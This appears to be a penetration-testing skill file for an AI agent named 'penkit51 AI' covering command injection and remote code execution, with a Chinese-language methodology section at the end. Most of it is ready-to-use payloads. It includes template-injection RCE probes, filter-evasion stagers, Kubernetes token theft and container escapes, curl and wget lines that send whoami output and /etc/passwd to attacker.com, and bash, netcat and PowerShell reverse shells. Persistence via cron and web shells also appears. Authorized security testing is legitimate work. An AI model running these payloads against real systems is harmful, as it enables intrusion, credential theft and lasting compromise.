---
name: command-injection-testing
description: RCE testing covering command injection, deserialization, template injection, and code evaluation
---

# Command Injection Testing

> **penkit51 AI** — professional penetration testing skill pack. Authorized testing only.

## Deep Exploitation Guide

# RCE

Remote code execution leads to full server control when input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media pipelines, and build/runtime tooling. Focus on quiet, portable oracles and chain to stable shells only when needed.

## Attack Surface

**Command Execution**
- OS command execution via wrappers (shells, system utilities, CLIs)

**Dynamic Evaluation**
- Template engines, expression languages, eval/vm

**Deserialization**
- Insecure deserialization and gadget chains across languages

**Media Pipelines**
- ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg

**SSRF Chains**
- Internal services exposing execution primitives (FastCGI, Redis)

**Container Escalation**
- App RCE to node/cluster compromise via Docker/Kubernetes

## Detection Channels

### Time-Based

**Unix**
- `;sleep 1`, `` `sleep 1` ``, `|| sleep 1`
- Gate delays with short subcommands to reduce noise

**Windows**
- CMD: `& timeout /t 2 &`, `ping -n 2 127.0.0.1`
- PowerShell: `Start-Sleep -s 2`

### OAST

Use `interactsh-client -v` in the sandbox to mint a unique callback
domain (`*.oast.fun`); substitute it for `attacker.tld` below. Each
invocation prints inbound DNS/HTTP hits to stdout in real time.

**DNS**
```bash
nslookup $(whoami).xyz.oast.fun
```

**HTTP**
```bash
curl https://xyz.oast.fun/$(hostname)
```

### Output-Based

**Direct**
```bash
;id;uname -a;whoami
```

**Encoded**
```bash
;(id;hostname)|base64
```

## Key Vulnerabilities

### Command Injection

**Delimiters and Operators**
- Unix: `; | || & && `cmd` $(cmd) $() ${IFS}` newline/tab
- Windows: `& | || ^`

**Argument Injection**
- Inject flags/filenames into CLI arguments (e.g., `--output=/tmp/x`, `--config=`)
- Break out of quoted segments by alternating quotes and escapes
- Environment expansion: `$PATH`, `${HOME}`, command substitution
- Windows: `%TEMP%`, `!VAR!`, PowerShell `$(...)`

**Path and Builtin Confusion**
- Force absolute paths (`/usr/bin/id`) vs relying on PATH
- Use builtins or alternative tools (`printf`, `getent`) when `id` is filtered
- Use `sh -c` or `cmd /c` wrappers to reach the shell

**Evasion**
- Whitespace/IFS: `${IFS}`, `$'\t'`, `<`
- Token splitting: `w'h'o'a'm'i`, `w"h"o"a"m"i`
- Variable building: `a=i;b=d; $a$b`
- Base64 stagers: `echo payload | base64 -d | sh`
- PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`

### Template Injection

Identify server-side template engines: Jinja2/Twig/Blade/Freemarker/Velocity/Thymeleaf/EJS/Handlebars/Pug

**Minimal Probes**
```
Jinja2: {{7*7}} → {{cycler.__init__.__globals__['os'].popen('id').read()}}
Twig: {{7*7}} → {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
Freemarker: ${7*7} → <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>
```

### Deserialization and EL

**Java**
- Gadget chains via CommonsCollections/BeanUtils/Spring
- Tools: ysoserial
- JNDI/LDAP chains (Log4Shell-style) when lookups are reachable

**.NET**
- BinaryFormatter/DataContractSerializer
- APIs accepting untrusted ViewState without MAC

**PHP**
- `unserialize()` and PHAR metadata
- Autoloaded gadget chains in frameworks and plugins

**Python/Ruby**
- pickle, `yaml.load`/`unsafe_load`, Marshal
- Auto-deserialization in message queues/caches

**Expression Languages**
- OGNL/SpEL/MVEL/EL reaching Runtime/ProcessBuilder/exec

### Media and Document Pipelines

**ImageMagick/GraphicsMagick**
- policy.xml may limit delegates; still test legacy vectors
```
push graphic-context
fill 'url(https://x.tld/a"|id>/tmp/o")'
pop graphic-context
```

**Ghostscript**
- PostScript in PDFs/PS: `%pipe%id` file operators

**ExifTool**
- Crafted metadata invoking external tools or library bugs

**LaTeX**
- `\write18`/`--shell-escape`, `\input` piping; pandoc filters

**ffmpeg**
- concat/protocol tricks mediated by compile-time flags

### SSRF to RCE

**FastCGI**
- `gopher://` to php-fpm (build FPM records to invoke system/exec)

**Redis**
- `gopher://` write cron/authorized_keys or webroot
- Module load when allowed

**Admin Interfaces**
- Jenkins script console, Spark UI, Jupyter kernels reachable internally

### Container and Kubernetes

**Docker**
- From app RCE, inspect `/.dockerenv`, `/proc/1/cgroup`
- Enumerate mounts and capabilities: `capsh --print`
- Abuses: mounted docker.sock, hostPath mounts, privileged containers
- Write to `/proc/sys/kernel/core_pattern` or mount host with `--privileged`

**Kubernetes**
- Steal service account token from `/var/run/secrets/kubernetes.io/serviceaccount`
- Query API for pods/secrets; enumerate RBAC
- Talk to kubelet on 10250/10255; exec into pods
- Escalate via privileged pods, hostPath mounts, or daemonsets

## Bypass Techniques

**Encoding Differentials**
- URL encoding, Unicode normalization, comment insertion, mixed case
- Request smuggling to reach alternate parsers

**Binary Alternatives**
- Absolute paths and alternate binaries (busybox, sh, env)
- Windows variations (PowerShell vs CMD)
- Constrained language bypasses

## Post-Exploitation

**Privilege Escalation**
- `sudo -l`; SUID binaries; capabilities (`getcap -r / 2>/dev/null`)

**Persistence**
- cron/systemd/user services; web shell behind auth
- Plugin hooks; supply chain in CI/CD

**Lateral Movement**
- SSH keys, cloud metadata credentials, internal service tokens

## Testing Methodology

1. **Identify sinks** - Command wrappers, template rendering, deserialization, file converters, report generators, plugin hooks
2. **Establish oracle** - Timing, DNS/HTTP callbacks, or deterministic output diffs (length/ETag)
3. **Confirm context** - User, working directory, PATH, shell, SELinux/AppArmor, containerization
4. **Map boundaries** - Read/write locations, outbound egress
5. **Progress to control** - File write, scheduled execution, service restart hooks

## Validation

1. Provide a minimal, reliable oracle (DNS/HTTP/timing) proving code execution
2. Show command context (uid, gid, cwd, env) and controlled output
3. Demonstrate persistence or file write under application constraints
4. If containerized, prove boundary crossing attempts (host files, kube APIs) and whether they succeed
5. Keep PoCs minimal and reproducible across runs and transports

## False Positives

- Only crashes or timeouts without controlled behavior
- Filtered execution of a limited command subset with no attacker-controlled args
- Sandboxed interpreters executing in a restricted VM with no IO or process spawn
- Simulated outputs not derived from executed commands

## Impact

- Remote system control under application user; potential privilege escalation to root
- Data theft, encryption/signing key compromise, supply-chain insertion, lateral movement
- Cluster compromise when combined with container/Kubernetes misconfigurations

## Pro Tips

1. Prefer OAST oracles; avoid long sleeps—short gated delays reduce noise
2. When command injection is weak, pivot to file write or deserialization/SSTI paths
3. Treat converters/renderers as first-class sinks; many run out-of-process with powerful delegates
4. For Java/.NET, enumerate classpaths/assemblies and known gadgets; verify with out-of-band payloads
5. Confirm environment: PATH, shell, umask, SELinux/AppArmor, container caps
6. Keep payloads portable (POSIX/BusyBox/PowerShell) and minimize dependencies
7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops

## Tooling

- Reverse-shell listener: `ncat -lvnp 4444` (in the sandbox; `ncat` is the
  netcat variant that ships in the image). Pair with a one-shot shell
  payload only when OAST + selective reads are insufficient — never
  drop a persistent shell when a single targeted command will prove it.

## Summary

RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defenses often differ per code path.

## Platform Methodology

# 命令注入漏洞测试

## 概述

命令注入是一种通过应用程序执行系统命令的漏洞。当应用程序将用户输入直接传递给系统命令时，攻击者可以执行任意命令。本技能提供命令注入的检测、利用和防护方法。

## 漏洞原理

应用程序调用系统命令时，未对用户输入进行充分验证和过滤，导致攻击者可以注入额外的命令。

**危险代码示例：**
```php
// PHP
system("ping " . $_GET['ip']);

// Python
os.system("ping " + user_input)

// Node.js
child_process.exec("ping " + user_input)
```

## 测试方法

### 1. 识别命令执行点

**常见功能：**
- Ping功能
- DNS查询
- 文件操作
- 系统信息
- 日志查看
- 备份恢复

### 2. 基础检测

**测试命令分隔符：**
```
;  # 命令分隔符（Linux/Windows）
&  # 后台执行（Linux/Windows）
|  # 管道符（Linux/Windows）
&& # 逻辑与（Linux/Windows）
|| # 逻辑或（Linux/Windows）
`  # 命令替换（Linux）
$() # 命令替换（Linux）
```

**测试Payload：**
```
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
```

### 3. 盲命令注入

**时间延迟检测：**
```
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
```

**外带数据：**
```
127.0.0.1; curl http://attacker.com/?$(whoami)
127.0.0.1 && wget http://attacker.com/$(cat /etc/passwd)
```

**DNS外带：**
```
127.0.0.1; nslookup $(whoami).attacker.com
```

## 利用技术

### 基础命令执行

**Linux：**
```
; id
; whoami
; uname -a
; cat /etc/passwd
; ls -la
```

**Windows：**
```
& whoami
& ipconfig
& type C:\Windows\System32\drivers\etc\hosts
& dir
```

### 文件操作

**读取文件：**
```
; cat /etc/passwd
; type C:\Windows\System32\config\sam
; head -n 20 /var/log/apache2/access.log
```

**写入文件：**
```
; echo "<?php phpinfo(); ?>" > /tmp/shell.php
; echo "test" > C:\temp\test.txt
```

### 反弹Shell

**Bash：**
```
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Netcat：**
```
; nc -e /bin/bash attacker.com 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

**PowerShell：**
```
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## 绕过技术

### 空格绕过

```
${IFS}id
${IFS}whoami
$IFS$9id
<>
%09 (Tab)
%20 (Space)
```

### 命令分隔符绕过

**编码绕过：**
```
%3b (;)
%26 (&)
%7c (|)
```

**换行绕过：**
```
%0a (换行)
%0d (回车)
```

### 关键字过滤绕过

**变量拼接：**
```bash
a=w;b=ho;c=ami;$a$b$c
```

**通配符：**
```bash
/bin/c?t /etc/passwd
/usr/bin/ca* /etc/passwd
```

**引号绕过：**
```bash
w'h'o'a'm'i
w"h"o"a"m"i
```

**反斜杠：**
```bash
w\ho\am\i
```

**Base64编码：**
```bash
echo "d2hvYW1p" | base64 -d | bash
```

### 长度限制绕过

**使用文件：**
```bash
echo "id" > /tmp/c
sh /tmp/c
```

**使用环境变量：**
```bash
export x='id';$x
```

## 工具使用

### Commix

```bash
# 基础扫描
python commix.py -u "http://target.com/ping?ip=127.0.0.1"

# 指定注入点
python commix.py -u "http://target.com/ping?ip=INJECT_HERE" --data="ip=INJECT_HERE"

# 获取Shell
python commix.py -u "http://target.com/ping?ip=127.0.0.1" --os-shell
```

### Burp Suite

1. 拦截请求
2. 发送到Intruder
3. 使用命令注入Payload列表
4. 观察响应或时间延迟

## 验证和报告

### 验证步骤

1. 确认可以执行系统命令
2. 验证命令执行结果
3. 评估影响（系统控制、数据泄露等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和输入参数
- 可执行的命令类型
- 完整的利用步骤和POC
- 修复建议（输入验证、参数化、白名单等）

## 防护措施

### 推荐方案

1. **避免命令执行**
   - 使用API替代系统命令
   - 使用库函数替代命令

2. **输入验证**
   ```python
   import re
   
   def validate_ip(ip):
       pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
       if not re.match(pattern, ip):
           raise ValueError("Invalid IP")
       parts = ip.split('.')
       if not all(0 <= int(p) <= 255 for p in parts):
           raise ValueError("Invalid IP range")
       return ip
   ```

3. **参数化命令**
   ```python
   import subprocess
   
   # 危险
   subprocess.call(['ping', '-c', '1', user_input])
   
   # 安全 - 使用参数列表
   subprocess.call(['ping', '-c', '1', validated_ip])
   ```

4. **白名单验证**
   ```python
   ALLOWED_COMMANDS = ['ping', 'nslookup']
   ALLOWED_OPTIONS = {'ping': ['-c', '-n']}
   
   if command not in ALLOWED_COMMANDS:
       raise ValueError("Command not allowed")
   ```

5. **最小权限**
   - 使用低权限用户运行应用
   - 限制文件系统访问
   - 使用chroot或容器隔离

6. **输出过滤**
   - 限制输出内容
   - 过滤敏感信息
   - 记录命令执行日志

## 注意事项

- 仅在授权测试环境中进行
- 避免对系统造成破坏
- 注意不同操作系统的命令差异
- 测试时注意命令执行的影响范围

## Validation & Reporting

- Confirm every finding with reproducible PoC before reporting
- Document: severity (CVSS), affected asset, steps, evidence, remediation
- Use `record_vulnerability` when running inside the penkit51 platform
- Chain low-severity findings into higher-impact attack paths
- Never report without evidence — distinguish hypothesis from confirmed vuln

